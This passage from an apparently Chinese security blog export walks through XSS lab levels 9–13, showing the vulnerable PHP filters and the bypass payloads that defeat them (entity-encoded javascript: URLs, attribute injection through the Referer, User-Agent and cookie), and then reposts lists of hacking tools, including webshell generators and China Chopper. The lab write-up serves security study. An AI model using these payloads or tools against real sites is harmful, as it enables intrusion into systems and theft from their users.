<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===strpos(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¸ä¸Šä¸€å…³ç›¸æ¯”å¤šäº†ä¸€ä¸ªurlæ£€æµ‹,å¦‚æœæ²¡æœ‰å¸¦http://å°±ä¼šæŠ¥é”™</p>
<p><code>javascrip&amp;#x74;:alert(1)//http://test.com//</code></p>
<p>10</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™ä¸€é¢˜çš„<code>keyword</code>å‚æ•°ä¸éœ€è¦ç®¡,åªéœ€è¦æ§åˆ¶<code>t_sort</code> </p>
<p><code>t_sort=&quot; onclick=&#39;alert(1)&#39; type=&quot;text&quot;&gt;//</code></p>
<br>

<p>11.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨burpä¿®æ”¹referer </p>
<p><code>1&quot; type=&quot;text&quot; onclick=alert(1)//</code></p>
<p>12.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å’Œä¸Šä¸€å…³ä¸€æ ·ï¼Œåªä¸è¿‡å°±æ”¹UA </p>
<p>13</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ”¹cookie</p>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker_Tools-è½¬</title>
    <url>/posts/ec585c99/</url>
    <content><![CDATA[<h1 id="Hacker-Tools"><a href="#Hacker-Tools" class="headerlink" title="Hacker_Tools"></a>Hacker_Tools</h1><p>æ¥æºï¼š<a href="https://github.com/deliciousYSH/Hacker_Tools">https://github.com/deliciousYSH/Hacker_Tools</a></p>
<h1 id="æ‰«æå™¨"><a href="#æ‰«æå™¨" class="headerlink" title="æ‰«æå™¨"></a>æ‰«æå™¨</h1><p>Nmapç«¯å£æ‰«æå™¨ï¼š<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>è¢«åŠ¨å¼æ³¨å…¥æ£€æµ‹å·¥å…·ï¼š <a href="https://github.com/sea-god/GourdScan">https://github.com/sea-god/GourdScan</a><br>é«˜è´¨é‡æ‰«æLinux / FreeBSD Serverä¸­çš„ä»»ä½•æ¼æ´ï¼š<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>å­åŸŸåæ‰«æå™¨ï¼š<br>Altdns-é€šè¿‡å˜æ›´å’Œæ’åˆ—å‘ç°å­åŸŸï¼š<a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>SubBruteä½¿ç”¨å¼€æ”¾å¼è§£æå™¨ä½œä¸ºä¸€ç§ä»£ç†æ¥è§„é¿DNSé€Ÿç‡é™åˆ¶ï¼š<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br>subDomainsBrute 1.2ä¸€ä¸ªé’ˆå¯¹æ¸—é€æµ‹è¯•è€…çš„å¿«é€Ÿå­åŸŸæš´åŠ›å·¥å…·ï¼š<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>æœ¬åœ°ç½‘ç»œæ‰«æå™¨ï¼ˆæ‰“å¼€ç½‘é¡µæ—¶æ‰«ææœ¬åœ°ç½‘ç»œçš„PoC Javascriptï¼‰ï¼š<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>HellRaiseråŸºäºç«¯å£æ‰«æä»¥åŠå…³è”CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>Routeh-é¡µé¢ä¸Šçš„æ¼æ´è·¯ç”±å™¨ï¼š<br><a href="https://github.com/jh00nbr/Routeh">https://github.com/jh00nbr/Routeh</a><br>é˜²ç«å¢™æ£€æµ‹å·¥å…·ï¼š<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>æ¼æ´æ‰«æç¨‹åºï¼Œä»¥æœ€å°‘çš„è§„åˆ™é›†åœ¨çŸ­æ—¶é—´å†…æ‰«æå¤§é‡ç›®æ ‡ï¼š<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>åŸºäºSQLMAPçš„ä¸»åŠ¨å’Œè¢«åŠ¨SQLæ³¨å…¥çš„æ¼æ´æ‰«æå·¥å…·ï¼š <a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p>
<h1 id="ä¿¡æ¯æœé›†å·¥å…·"><a href="#ä¿¡æ¯æœé›†å·¥å…·" class="headerlink" title="ä¿¡æ¯æœé›†å·¥å…·"></a>ä¿¡æ¯æœé›†å·¥å…·</h1><p>ç¤¾å·¥æ”¶é›†å·¥å…·ï¼š<br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>ä¿¡æ¯æ‰«æå·¥å…·ï¼š<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>æœ¬åœ°ç½‘ç»œæ‰«æä»ªï¼š<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>é€šè¿‡RDPæ‰«æå¯è®¿é—®æ€§å·¥å…·åé—¨ï¼š<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>ç½‘ç»œåŸºç¡€è®¾æ–½æ¸—é€æµ‹è¯•å·¥å…·ï¼š<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>GitHubä¿¡æ¯æ”¶é›†ï¼š<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
<h1 id="å¯†ç ç ´è§£"><a href="#å¯†ç ç ´è§£" class="headerlink" title="å¯†ç ç ´è§£"></a>å¯†ç ç ´è§£</h1><p>å¯†ç ç ´è§£å·¥å…·ï¼ˆå¼€è†›æ‰‹Johnnyï¼‰:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>è·å–å­˜å‚¨åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šå¤§é‡çš„å¯†ç ï¼š<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a><br>SNMPæš´åŠ›ç ´è§£ï¼š<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
<h1 id="Webæ¸—é€ï¼ˆç¦æ­¢ç”¨ä½œè¿æ³•ï¼‰"><a href="#Webæ¸—é€ï¼ˆç¦æ­¢ç”¨ä½œè¿æ³•ï¼‰" class="headerlink" title="Webæ¸—é€ï¼ˆç¦æ­¢ç”¨ä½œè¿æ³•ï¼‰"></a>Webæ¸—é€ï¼ˆç¦æ­¢ç”¨ä½œè¿æ³•ï¼‰</h1><p>HTTPæš´åŠ›ç ´è§£ï¼Œæ’åº“æ”»å‡»è„šæœ¬ï¼š<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>webshellï¼š<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>å…æ€webshellæ— é™ç”Ÿæˆå·¥å…·ï¼š<br><a href="https://github.com/yzddmr6/webshell-venom">https://github.com/yzddmr6/webshell-venom</a><br>æ¸—é€å·¥å…·åˆé›†ï¼š<br><a href="https://github.com/rootphantomer/hack_tools_for_me">https://github.com/rootphantomer/hack_tools_for_me</a><br>XSSOR-æ–¹ä¾¿XSSä¸CSRFçš„å·¥å…·ï¼š<br><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a><br>w3af-Webåº”ç”¨ç¨‹åºæ”»å‡»å’Œå®¡æ ¸æ¡†æ¶ï¼š<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>æ¸—é€æµ‹è¯•åŒ…ï¼š<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>ç½‘ç»œè·¯å¾„æ‰«æä»ªï¼š<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>ä»£ç æ³¨å…¥æ£€æµ‹å·¥å…·ï¼š <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> hackUtilsï¼š<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>Nikto WebæœåŠ¡å™¨æ‰«æä»ªï¼š<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>è‡ªåŠ¨åŒ–çš„å¤šåˆä¸€OSå‘½ä»¤æ³¨å…¥å’Œåˆ©ç”¨å·¥å…·ï¼š<br><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br>sslscanæµ‹è¯•ï¼š<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>Windowså®‰å…¨å·¥å…·å¥—ä»¶ï¼š<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>Apacheå®æ—¶æ—¥å¿—åˆ†æå™¨ç³»ç»Ÿï¼š<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>æ£€æµ‹ç½‘ç»œå…¥ä¾µçš„ç‰¹å¾ï¼Œæ¶æ„èœ˜è››ï¼ˆMalspiderï¼‰ï¼š<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>ä¸‹ä¸€ä»£ç½‘ç»œæ‰«æä»ªWhatWebï¼š<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>WPScanï¼ŒWordPressæ¼æ´æ‰«æç¨‹åºï¼š<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>ã€sqlmapã€‘:<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>SQLi-Hunter(HTTPä»£ç†æœåŠ¡å™¨å’Œä¸€ä¸ªSQLMAP APIåŒ…è£…å™¨):<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>ä¸­å›½èœåˆ€ï¼š<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Webåº”ç”¨ç¨‹åºæ¨¡ç³Šå™¨ï¼š<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
<h1 id="æ¼æ´åŠæ¸—é€ç»ƒä¹ å¹³å°"><a href="#æ¼æ´åŠæ¸—é€ç»ƒä¹ å¹³å°" class="headerlink" title="æ¼æ´åŠæ¸—é€ç»ƒä¹ å¹³å°"></a>æ¼æ´åŠæ¸—é€ç»ƒä¹ å¹³å°</h1><p>WebGoatæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://webgoat.github.io/WebGoat/">https://webgoat.github.io/WebGoat/</a><br>dvwaæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br>æ•°æ®åº“æ³¨å…¥ç»ƒä¹ å¹³å° ï¼š<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>like OWASP Node Goatï¼š<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Rubyç¼–å†™çš„ä¸€æ¬¾å·¥å…·ï¼Œå®‰å…¨æ–¹æ¡ˆç”Ÿæˆå™¨ï¼ˆSecGenï¼‰ï¼š<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a><br>VulAppsæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>ZVuldrill Webçªç ´æ¼”ç»ƒå¹³å°ï¼š<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>WebGoatæ—§ç‰ˆï¼š<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
]]></content>
      <categories>
        <category>å·¥å…·æ‰‹å†Œ</category>
      </categories>
      <tags>
        <tag>å·¥å…·æ‰‹å†Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>githubæ¸—é€æµ‹è¯•å·¥å…·é›†-è½¬</title>
    <url>/posts/a25c6c18/</url>
    <content><![CDATA[<p>è½¬è‡ª: <a href="https://mp.weixin.qq.com/s?__biz=Mzg5NDMzNjYxOA==&amp;mid=2247487430&amp;idx=1&amp;sn=d1a0ecdbe455d068804d540c12d4070b&amp;source=41#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzg5NDMzNjYxOA==&amp;mid=2247487430&amp;idx=1&amp;sn=d1a0ecdbe455d068804d540c12d4070b&amp;source=41#wechat_redirect</a></p>
<h1 id="æ¼æ´ç»ƒä¹ å¹³å°"><a href="#æ¼æ´ç»ƒä¹ å¹³å°" class="headerlink" title="æ¼æ´ç»ƒä¹ å¹³å°"></a>æ¼æ´ç»ƒä¹ å¹³å°</h1><p>WebGoatæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a><br>webgoat-legacyæ¼æ´ç»ƒä¹ å¹³å°:<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a><br>zvuldirllæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>vulappsæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>dvwaæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://github.com/RandomStorm/DVWA">https://github.com/RandomStorm/DVWA</a><br>æ•°æ®åº“æ³¨å…¥ç»ƒä¹ å¹³å° ï¼š<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>ç”¨nodeç¼–å†™çš„æ¼æ´ç»ƒä¹ å¹³å°ï¼Œlike OWASP NodeGoatï¼š<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Rubyç¼–å†™çš„ä¸€æ¬¾å·¥å…·ï¼Œç”Ÿæˆå«æ¼æ´çš„è™šæ‹Ÿæœºï¼š<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a></p>
<h1 id="èŠ±å¼æ‰«æå™¨"><a href="#èŠ±å¼æ‰«æå™¨" class="headerlink" title="èŠ±å¼æ‰«æå™¨"></a>èŠ±å¼æ‰«æå™¨</h1><p>Nmapç«¯å£æ‰«æå™¨ï¼š<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>æœ¬åœ°ç½‘ç»œæ‰«æå™¨ï¼š<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>å­åŸŸåæ‰«æå™¨ï¼š<br><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br><a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br><a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>linuxæ¼æ´æ‰«æï¼š<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>åŸºäºç«¯å£æ‰«æä»¥åŠå…³è”CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>æ¼æ´è·¯ç”±æ‰«æå™¨ï¼š<br><a href="https://github.com/jh00nbr/Routerhunter-2.0">https://github.com/jh00nbr/Routerhunter-2.0</a><br>è¿·ä½ æ‰¹é‡ä¿¡æ¯æ³„æ¼æ‰«æè„šæœ¬ï¼š<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>Wafç±»å‹æ£€æµ‹å·¥å…·ï¼š<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>æœåŠ¡å™¨ç«¯å£å¼±å£ä»¤æ‰«æå™¨ï¼š<br><a href="https://github.com/wilson9x1/fenghuangscanner_v3">https://github.com/wilson9x1/fenghuangscanner_v3</a><br>Fox-scanæ‰«æå™¨ï¼š<br><a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a><br>ä¿¡æ¯æœé›†å·¥å…·</p>
<h1 id="ç¤¾å·¥æ”¶é›†å™¨ï¼š"><a href="#ç¤¾å·¥æ”¶é›†å™¨ï¼š" class="headerlink" title="ç¤¾å·¥æ”¶é›†å™¨ï¼š"></a>ç¤¾å·¥æ”¶é›†å™¨ï¼š</h1><p><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>Githubä¿¡æ¯æœé›†ï¼š<br><a href="https://github.com/sea-god/gitscan">https://github.com/sea-god/gitscan</a><br>github Repoä¿¡æ¯æœé›†å·¥å…·ï¼š<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a><br>ä¿¡æ¯æ¢æµ‹åŠæ‰«æå·¥å…·ï¼š<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>å†…éƒ¨ç½‘ç»œä¿¡æ¯æ‰«æå™¨ï¼š<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>è¿œç¨‹æ¡Œé¢ç™»å½•æ‰«æå™¨ï¼š<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>ç½‘ç»œåŸºç¡€è®¾æ–½æ¸—é€å·¥å…·<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>SNMAPå¯†ç 